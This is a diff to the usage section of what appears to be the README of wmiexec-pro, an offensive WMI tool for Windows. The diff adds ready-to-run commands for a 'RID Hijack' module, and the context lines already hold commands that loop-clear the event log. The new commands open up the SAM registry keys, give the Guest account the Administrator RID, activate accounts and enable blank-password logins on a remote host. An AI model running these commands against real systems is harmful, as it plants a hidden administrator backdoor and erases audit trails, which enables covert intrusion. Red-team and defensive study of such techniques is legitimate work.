@@ -130,6 +130,17 @@ Services:
 Eventlog:
    python3 wmiexec-pro.py administrator:password@192.168.1.1 eventlog -risk-i-know (Looping cleaning eventlog)
    python3 wmiexec-pro.py administrator:password@192.168.1.1 eventlog -retrive object-ID (Stop looping cleaning eventlog)
+
+RID Hijack:
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -hijack-target 501 -action grant (Grant access permissions for SAM/SAM subkey in registry)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -hijack-target 501 -action grant-old (For old version OS, such as server 2003)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -hijack-target 501 -action retrieve (Restrict access permissions for SAM/SAM subkey in registry)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -hijack-target 501 -action retrieve-old (For old version OS, such as server 2003)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -hijack-target 501 -action activate (Activate user)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -hijack-target 501 -action deactivate (Deactivate user)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -hijack-target 501 -action hijack -hijack-target 501 -hijack-rid 500 (Hijack guest user rid 501 to administrator rid 500)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -blank-pass-login enable (Enable blank password login)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -blank-pass-login disable
    
 ```
 
